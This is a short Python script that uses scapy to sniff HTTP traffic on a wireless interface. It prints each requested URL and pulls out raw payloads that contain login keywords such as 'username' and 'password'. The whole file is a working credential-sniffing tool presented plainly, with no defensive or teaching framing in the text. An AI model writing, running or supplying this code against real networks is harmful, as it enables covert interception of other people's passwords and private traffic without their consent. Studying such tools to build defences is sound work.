import argparse
import scapy.all as scapy
from scapy.layers import http

#def get_interface():
    #parse = argparse.ArgumentParser()
    #parse.add_argument("-i", "--interface", dest="interface", help="Enter interface")
    #options = parse.parse_args()
    #return options

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        info = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "password", "pass", "login"]
        for keyword in keywords:
            if keyword in info:
                return info

def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request >> " + url.decode())
        login = get_login_info(packet)
        if login:
            print("\n\n USERNAME and PASSWORD INFO >> " + login + "\n\n")

#interface = get_interface()
sniff("wlan0")
